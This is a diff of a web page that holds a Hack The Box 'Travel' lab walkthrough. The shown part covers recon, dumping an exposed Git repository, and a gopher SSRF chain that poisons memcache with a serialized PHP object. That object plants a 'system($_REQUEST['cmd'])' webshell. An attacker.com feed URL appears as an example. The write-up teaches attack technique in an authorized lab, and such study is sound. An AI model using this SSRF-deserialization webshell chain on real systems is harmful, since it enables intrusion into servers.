@@ -1,14 +1,20 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-b:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-d:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-f:I[484,[],"OutletBoundary"]
-10:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Travel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An exposed Git repository documented an SSRF chain that poisoned memcache with a PHP object for code execution, a forgotten database backup yielded lynik-admin's SSH password, and LDAP write access added a sudo-group user with an attacker key."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T10:54:17.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[18," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-travel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Travel machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Travel machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/travel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":["$L5","$L6"]}]]}],null,"$L7"]}],"$L8","$L9"],null,"$La"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","aside",null,{"className":"article-context","aria-label":"Article context","children":[["$","$Lb",null,{"headings":[{"id":"introduction-the-big-picture","label":"Introduction: The Big Picture"},{"id":"phase-1-external-reconnaissance-mapping-the-attack-surface","label":"Phase 1: External Reconnaissance: Mapping the Attack Surface"},{"id":"phase-2-finding-the-entry-point-the-exposed-git-repository","label":"Phase 2: Finding the Entry Point: The Exposed Git Repository"},{"id":"phase-3-source-code-analysis-understanding-the-application","label":"Phase 3: Source Code Analysis: Understanding the Application"},{"id":"phase-4-exploiting-the-vulnerability-chain","label":"Phase 4: Exploiting the Vulnerability Chain"},{"id":"phase-5-post-exploitation-escaping-the-container","label":"Phase 5: Post-Exploitation: Escaping the Container"},{"id":"phase-6-moving-to-the-host-via-ssh","label":"Phase 6: Moving to the Host via SSH"},{"id":"phase-7-privilege-escalation-to-root-via-ldap","label":"Phase 7: Privilege Escalation to Root via LDAP"},{"id":"phase-8-lessons-learned-and-defense","label":"Phase 8: Lessons Learned & Defense"},{"id":"flags","label":"Flags"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3aee13cd377cbe7fe3c4c69c628157d7840f7800/HTB-Travel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 3aee13cd377c",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Travel, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/travel","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"6 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}]
-c:T990b,<p><strong>Machine:</strong> Travel<br><strong>OS:</strong> Linux (Ubuntu 20.04)<br><strong>Difficulty:</strong> Hard<br><strong>IP:</strong> <code>10.129.2.151</code><br><strong>Attacker:</strong> <code>10.10.14.6</code>  </p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Travel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An exposed Git repository documented an SSRF chain that poisoned memcache with a PHP object for code execution, a forgotten database backup yielded lynik-admin's SSH password, and LDAP write access added a sudo-group user with an attacker key."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"Travel"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/travel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Hard"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-travel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Travel machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Travel machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/travel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:Ta56c,<p><strong>Machine:</strong> Travel<br><strong>OS:</strong> Linux (Ubuntu 20.04)<br><strong>Difficulty:</strong> Hard<br><strong>IP:</strong> <code>10.129.2.151</code><br><strong>Attacker:</strong> <code>10.10.14.6</code>  </p>
 <hr>
 <h2 id="introduction-the-big-picture">Introduction: The Big Picture</h2>
 <p>Travel starts by mapping the target's services, trust boundaries, and reachable networks.</p>
@@ -39,7 +45,7 @@ c:T990b,<p><strong>Machine:</strong> Travel<br><strong>OS:</strong> Linux (Ubunt
 </ul>
 <p>Hackers don't guess. They enumerate systematically.</p>
 <h3 id="1-2-port-scanning-with-nmap">1.2 Port Scanning with Nmap</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.2.151
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.2.151
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
@@ -49,14 +55,14 @@ c:T990b,<p><strong>Machine:</strong> Travel<br><strong>OS:</strong> Linux (Ubunt
 <p><strong>Operational lesson:</strong>
 Many beginners only scan the top 1000 ports. On a real engagement, that's how you miss management interfaces, backup services, or Docker APIs sitting on port 2375 or 8080.</p>
 <p><strong>Results:</strong></p>
-<pre><code>PORT    STATE SERVICE
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
 443/tcp open  https
 </code></pre>
 <p>Only three ports. SSH is rarely the initial entry point on modern boxes (it requires credentials or key-based auth), so we focus on <strong>HTTP and HTTPS</strong>.</p>
 <h3 id="1-3-service-version-detection">1.3 Service Version Detection</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p 22,80,443 -sV -sC 10.129.2.151
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">nmap -p 22,80,443 -sV -sC 10.129.2.151
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
@@ -66,7 +72,7 @@ Many beginners only scan the top 1000 ports. On a real engagement, that's how yo
 <p>
 Version information narrows the relevant vulnerability and configuration checks. Here, the nginx and WordPress versions help define the plausible attack paths.</p>
 <p><strong>Critical Discovery - SSL Certificate SANs:</strong></p>
-<pre><code>ssl-cert: Subject: commonName=www.travel.htb
+<pre tabindex="0" aria-label="Code or terminal block 4"><code>ssl-cert: Subject: commonName=www.travel.htb
 Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
 </code></pre>
 <h3 id="1-4-virtual-hosts-the-hidden-websites">1.4 Virtual Hosts: The Hidden Websites</h3>
@@ -75,7 +81,7 @@ Web servers like nginx and Apache can host <strong>multiple websites on the same
 <p>
 The main site (<code>www.travel.htb</code>) might be a polished production site with heavy security. But <code>blog-dev.travel.htb</code> sounds like a <strong>development environment</strong> - and dev environments are often less secure, contain debugging features, or leak source code.</p>
 <p><strong>Adding hosts to /etc/hosts:</strong></p>
-<pre><code class="language-bash" data-language="bash">echo "10.129.2.151    travel.htb www.travel.htb blog.travel.htb blog-dev.travel.htb" | sudo tee -a /etc/hosts
+<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">echo "10.129.2.151    travel.htb www.travel.htb blog.travel.htb blog-dev.travel.htb" | sudo tee -a /etc/hosts
 </code></pre>
 <p><strong>Why <code>/etc/hosts</code>?</strong>
 Your computer needs to resolve hostnames to IPs. Since this is a lab environment without public DNS, we manually map them. Without this, <code>curl http://blog.travel.htb</code> wouldn't know where to go.</p>
@@ -105,7 +111,7 @@ Your computer needs to resolve hostnames to IPs. Since this is a lab environment
 <li><code>/robots.txt</code> : Tells us what the site owner is hiding</li>
 </ul>
 <h3 id="2-2-finding-git-with-gobuster">2.2 Finding .git with Gobuster</h3>
-<pre><code class="language-bash" data-language="bash">gobuster dir -u http://blog-dev.travel.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash">gobuster dir -u http://blog-dev.travel.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 </code></pre>
 <p><strong>Discovery:</strong> <code>/.git/HEAD</code> returns HTTP 200.</p>
 <p><strong>What is <code>.git/HEAD</code>?</strong>
@@ -114,14 +120,14 @@ Git stores repository metadata in a <code>.git</code> folder. <code>HEAD</code> 
 They deploy by running <code>git clone</code> or copying files but forget to remove <code>.git</code>. They might think <code>.htaccess</code> protects it, but misconfigurations happen constantly. This is one of the most common and critical vulnerabilities in web applications.</p>
 <h3 id="2-3-dumping-the-git-repository">2.3 Dumping the Git Repository</h3>
 <p>We use <code>git-dumper</code>, a tool specifically designed to reconstruct a Git repository from an exposed <code>.git</code> folder:</p>
-<pre><code class="language-bash" data-language="bash">git clone https://github.com/arthaud/git-dumper.git
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">git clone https://github.com/arthaud/git-dumper.git
 pip3 install PySocks dulwich
 python3 git-dumper/git_dumper.py http://blog-dev.travel.htb/ gitsource
 </code></pre>
 <p><strong>How git-dumper works:</strong>
 It walks the Git object database (<code>.git/objects/</code>), downloads all commits, trees, and blobs, then reconstructs the file system. Git is a <strong>content-addressable filesystem</strong> - every file version is stored as a hash. If we have all the hashes, we have all the history.</p>
 <h3 id="2-4-restoring-deleted-files">2.4 Restoring Deleted Files</h3>
-<pre><code class="language-bash" data-language="bash">cd gitsource
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">cd gitsource
 git checkout -- .
 </code></pre>
 <p><strong>Why this step?</strong>
@@ -135,7 +141,7 @@ The repository might have files that were committed but later deleted from the w
 <hr>
 <h2 id="phase-3-source-code-analysis-understanding-the-application">Phase 3: Source Code Analysis: Understanding the Application</h2>
 <h3 id="3-1-readme-md-the-developer-s-notes">3.1 README.md: The Developer's Notes</h3>
-<pre><code class="language-markdown" data-language="markdown"># Rss Template Extension
+<pre tabindex="0" aria-label="markdown code or terminal block 9"><code class="language-markdown" data-language="markdown"># Rss Template Extension
 Allows rss-feeds to be shown on a custom wordpress page.
 
 ## Setup
@@ -160,7 +166,7 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </ol>
 <h3 id="3-2-rss-template-php-the-rss-feed-parser">3.2 rss_template.php: The RSS Feed Parser</h3>
 <p>This file creates the <code>/awesome-rss/</code> page on the blog. Break it down:</p>
-<pre><code class="language-php" data-language="php">function get_feed($url){
+<pre tabindex="0" aria-label="php code or terminal block 10"><code class="language-php" data-language="php">function get_feed($url){
     require_once ABSPATH . '/wp-includes/class-simplepie.php';
     $simplepie = new SimplePie();
     $simplepie-&gt;set_cache_location('memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_');
@@ -177,7 +183,7 @@ Allows rss-feeds to be shown on a custom wordpress page.
 <li>Cache keys are prefixed with <strong><code>xct_</code></strong></li>
 </ul>
 <p><strong>The URL Logic:</strong></p>
-<pre><code class="language-php" data-language="php">$url = $_SERVER['QUERY_STRING'];
+<pre tabindex="0" aria-label="php code or terminal block 11"><code class="language-php" data-language="php">$url = $_SERVER['QUERY_STRING'];
 if(strpos($url, "custom_feed_url") !== false){
     $tmp = (explode("=", $url));
     $url = end($tmp);
@@ -187,11 +193,11 @@ if(strpos($url, "custom_feed_url") !== false){
 </code></pre>
 <p><strong>Why this is dangerous:</strong>
 If the query string contains <code>custom_feed_url</code>, it splits by <code>=</code> and takes the <strong>last part</strong> as the URL. This means:</p>
-<pre><code>?custom_feed_url&amp;url=http://attacker.com/feed
+<pre tabindex="0" aria-label="Code or terminal block 12"><code>?custom_feed_url&amp;url=http://attacker.com/feed
 </code></pre>
 <p>The <code>$url</code> becomes <code>http://attacker.com/feed</code>.</p>
 <p><strong>The <code>debug</code> parameter:</strong></p>
-<pre><code class="language-php" data-language="php">&lt;!--
+<pre tabindex="0" aria-label="php code or terminal block 13"><code class="language-php" data-language="php">&lt;!--
 DEBUG
 &lt;?php
 if (isset($_GET['debug'])){
@@ -204,7 +210,7 @@ if (isset($_GET['debug'])){
 <h3 id="3-3-template-php-the-security-layer">3.3 template.php: The "Security" Layer</h3>
 <p>This file has two critical parts:</p>
 <h4 id="part-a-safe-the-input-filter">Part A: <code>safe()</code> - The Input Filter</h4>
-<pre><code class="language-php" data-language="php">function safe($url)
+<pre tabindex="0" aria-label="php code or terminal block 14"><code class="language-php" data-language="php">function safe($url)
 {
     $tmpUrl = urldecode($url);
     if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
@@ -241,7 +247,7 @@ Input validation is hard. The developer used a <strong>blocklist</strong> ("deny
 </ul>
 <p>This is a fundamental lesson: <strong>Do not trust user input.</strong> And Do not assume a simple string check is sufficient for security.</p>
 <h4 id="part-b-url-get-contents-the-command-execution">Part B: <code>url_get_contents()</code> - The Command Execution</h4>
-<pre><code class="language-php" data-language="php">function url_get_contents ($url) {
+<pre tabindex="0" aria-label="php code or terminal block 15"><code class="language-php" data-language="php">function url_get_contents ($url) {
     $url = safe($url);
     $url = escapeshellarg($url);
     $pl = "curl ".$url;
@@ -258,7 +264,7 @@ Input validation is hard. The developer used a <strong>blocklist</strong> ("deny
 <p><strong>Why <code>escapeshellarg</code> doesn't save us:</strong>
 <code>escapeshellarg</code> prevents command injection (you can't do <code>; rm -rf /</code>), but it <strong>doesn't prevent SSRF</strong>. The URL is still passed to curl, and curl supports many protocols besides HTTP: <code>ftp://</code>, <code>dict://</code>, <code>gopher://</code>, <code>file://</code> (if not blocked), etc.</p>
 <h4 id="part-c-templatehelper-the-deserialization-gadget">Part C: <code>TemplateHelper</code> - The Deserialization Gadget</h4>
-<pre><code class="language-php" data-language="php">class TemplateHelper
+<pre tabindex="0" aria-label="php code or terminal block 16"><code class="language-php" data-language="php">class TemplateHelper
 {
     private $file;
     private $data;
@@ -292,10 +298,10 @@ If we can make the server deserialize a <code>TemplateHelper</code> object where
 <li><code>$data</code> = <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></li>
 </ul>
 <p>Then <code>__wakeup()</code> will call <code>init()</code>, which will write our webshell to:</p>
-<pre><code>__DIR__.'/logs/'.$this-&gt;file
+<pre tabindex="0" aria-label="Code or terminal block 17"><code>__DIR__.'/logs/'.$this-&gt;file
 </code></pre>
 <p>Since <code>template.php</code> is in <code>wp-content/themes/twentytwenty/</code>, the shell goes to:</p>
-<pre><code>/wp-content/themes/twentytwenty/logs/shell.php
+<pre tabindex="0" aria-label="Code or terminal block 18"><code>/wp-content/themes/twentytwenty/logs/shell.php
 </code></pre>
 <hr>
 <h2 id="phase-4-exploiting-the-vulnerability-chain">Phase 4: Exploiting the Vulnerability Chain</h2>
@@ -311,7 +317,7 @@ If we can make the server deserialize a <code>TemplateHelper</code> object where
 </ol>
 <h3 id="4-2-why-gopher-and-not-http">4.2 Why Gopher and Not HTTP?</h3>
 <p>If we tried to use <code>http://127.0.0.1:11211/</code>, curl would send:</p>
-<pre><code>GET / HTTP/1.1
+<pre tabindex="0" aria-label="Code or terminal block 19"><code>GET / HTTP/1.1
 Host: 127.0.0.1:11211
 User-Agent: curl/7.68.0
 Accept: */*
@@ -321,16 +327,16 @@ Accept: */*
 <h3 id="4-3-understanding-memcache-key-generation">4.3 Understanding Memcache Key Generation</h3>
 <p>Before we can poison the cache, we need to know <strong>the exact key name</strong>. SimplePie generates it dynamically.</p>
 <p><strong>Step 1: The feed URL is hashed</strong></p>
-<pre><code class="language-php" data-language="php">$cache_name_function = 'md5';
+<pre tabindex="0" aria-label="php code or terminal block 20"><code class="language-php" data-language="php">$cache_name_function = 'md5';
 $filename = md5($url);
 </code></pre>
 <p>For the default feed:</p>
-<pre><code class="language-bash" data-language="bash">echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum
 # REDACTED_HASH_OR_FLAG
 </code></pre>
 <p><strong>Step 2: Append the type</strong>
 The cache type for feed data is <code>spc</code>:</p>
-<pre><code class="language-bash" data-language="bash">echo -n 'REDACTED_HASH_OR_FLAG:spc' | md5sum
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">echo -n 'REDACTED_HASH_OR_FLAG:spc' | md5sum
 # REDACTED_HASH_OR_FLAG
 </code></pre>
 <p><strong>Step 3: Add the prefix</strong>
@@ -340,7 +346,7 @@ From <code>rss_template.php</code>: <code>prefix=xct_</code></p>
 We could host our own feed and calculate a new key, but using the default key is faster. The only risk is that someone else might overwrite it, but on a private instance, that's not an issue.</p>
 <h3 id="4-4-crafting-the-serialized-payload">4.4 Crafting the Serialized Payload</h3>
 <p>We create a local PHP script to generate the exact serialized string:</p>
-<pre><code class="language-php" data-language="php">&lt;?php
+<pre tabindex="0" aria-label="php code or terminal block 23"><code class="language-php" data-language="php">&lt;?php
 class TemplateHelper {
     public $file;
     public $data;
@@ -356,16 +362,16 @@ echo serialize($obj);
 <p><strong>Why <code>public</code> instead of <code>private</code>?</strong>
 In the original source, <code>$file</code> and <code>$data</code> are <code>private</code>. However, PHP's serialization format for private properties includes null bytes and class names, making manual crafting error-prone. Using <code>public</code> in our payload works because PHP's deserialization engine <strong>matches properties by name</strong>, and the <code>__wakeup()</code> method reinitializes them through <code>init()</code>.</p>
 <p><strong>Output:</strong></p>
-<pre><code>O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"&lt;?php system($_REQUEST["cmd"]); ?&gt;";}
+<pre tabindex="0" aria-label="Code or terminal block 24"><code>O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"&lt;?php system($_REQUEST["cmd"]); ?&gt;";}
 </code></pre>
 <p><strong>Length: 106 bytes.</strong> This is important for the memcache <code>SET</code> command.</p>
 <h3 id="4-5-the-memcache-set-command">4.5 The Memcache SET Command</h3>
 <p>Memcache protocol for storing data:</p>
-<pre><code>set &lt;key&gt; &lt;flags&gt; &lt;exptime&gt; &lt;bytes&gt;\r\n
+<pre tabindex="0" aria-label="Code or terminal block 25"><code>set &lt;key&gt; &lt;flags&gt; &lt;exptime&gt; &lt;bytes&gt;\r\n
 &lt;value&gt;\r\n
 </code></pre>
 <p>For our attack:</p>
-<pre><code>set xct_4e5612ba079c530a6b1f148c0b352241 4 0 106\r\n
+<pre tabindex="0" aria-label="Code or terminal block 26"><code>set xct_4e5612ba079c530a6b1f148c0b352241 4 0 106\r\n
 O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"&lt;?php system($_REQUEST["cmd"]); ?&gt;";}\r\n
 </code></pre>
 <ul>
